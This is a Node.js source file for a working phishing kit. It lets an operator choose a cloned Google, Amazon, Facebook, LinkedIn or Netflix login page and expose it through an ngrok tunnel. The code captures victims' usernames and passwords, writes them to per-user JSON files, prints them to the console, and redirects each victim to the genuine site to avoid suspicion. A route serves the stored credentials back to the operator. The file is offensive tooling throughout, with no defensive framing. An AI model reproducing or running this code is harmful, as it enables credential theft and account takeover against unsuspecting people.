// libs
const express = require('express')
const fs = require('fs')
const session = require('express-session')
const bodyParser = require('body-parser')
const path = require('path')
const readline = require('readline-sync')
const { exit } = require('process')
const fakepass = require('./pass/pased.json')
const fetch = require('node-fetch')
const Bluebird = require('bluebird');
fetch.Promise = Bluebird

// colors
vermelho = '\033[31m'
verde = '\033[32m'
azul = '\033[34m'

ciano = '\033[36m'
magenta = '\033[35m'
amarelo = '\033[33m'
preto = '\033[30m'
r = '\033[0;0m'
negrito = '\033[1m'


// get link ngrok
async function most_link(){
    await fetch('http://127.0.0.1:4040/api/tunnels')
    .then(data => data.json())
    .then(body => console.log(`${vermelho}Pishing${r} Link:${vermelho} ${body['tunnels'][0]['public_url']}${amarelo}\nAwait...${r}`))
}

// input and output
console.clear()
console.log('')

console.log(`${magenta}CHOOSE${r} A ${verde}TEMPLATE${r} FOR ${vermelho}PHISHING:${verde}`)
sites = ['Google', 'Amazon', 'Facebook', 'Linkedin', 'Netflix']
index = readline.keyInSelect(sites, `${magenta}[Set]${r}`)
var siteEscolido = sites[index] 

if (siteEscolido == undefined){
    console.log(`${vermelho}#${negrito} Aborted.${r}`)
    exit()

}

// app 
var app = express()
app.use(session({
	secret: 'secret',
	resave: true,
	saveUninitialized: true
}))

app.use(bodyParser.urlencoded({extended : true}))
app.use(bodyParser.json())

// servir template
app.get('/', function(request, response) {
	response.sendFile(path.join(__dirname + `/pages/${siteEscolido}/index.html`))
})


// rota do pishing
app.post('/auth', function(request, response) {
	var user = request.body.user
	var pwd = request.body.pwd

    fs.writeFile(`db/${user}.user.json`, `
{
        "username":"${user}",
        "pass":"${pwd}"
}`, (err, data)=>{

    
    })

    console.log(`\n${verde}Login${negrito} from:${verde} ${siteEscolido}${r}`)
    console.log(`${verde}User:${negrito} ${user}${r}`)
    console.log(`${verde}Pass:${negrito} ${pwd}${r}`)
    console.log('')
	
    // fake pass...
    if (siteEscolido == 'Google'){
        response.redirect(fakepass.Google)
        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)

    } if (siteEscolido == 'Facebook'){
        response.redirect(fakepass.Facebook)
        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)

    } if (siteEscolido == 'Amazon'){
        response.redirect(fakepass.Amazon)
        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)

    } if (siteEscolido == 'Linkedin'){
        response.redirect(fakepass.Linkedin)
        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)

    } if (siteEscolido == 'Netflix'){
        response.redirect(fakepass.Netflix)
        console.log(`${magenta}User: ${negrito}${user}${verde} Redirected.${r}`)

    }
})


// rota que mostra os dados do pishing
app.get('/vw/:user', (req, res)=> {
    res.sendFile(path.join(__dirname + `/db/${req.params.user}.user.json`))
})


// init server
app.listen(1337, ()=> {
    console.log('')
    console.log(`${verde}AUTHOR:${negrito} Gab${r}`)
    console.log(`${verde}GITHUB:${negrito} https://github.com/${negrito}gabhm${r}`)
    console.log(``)
    console.log(`${amarelo}WARNING ${negrito} TO ${vermelho}CLOSE${verde}${negrito} THE SERVER, TYPE: CTRL + C !!${r}`)
    most_link()
})
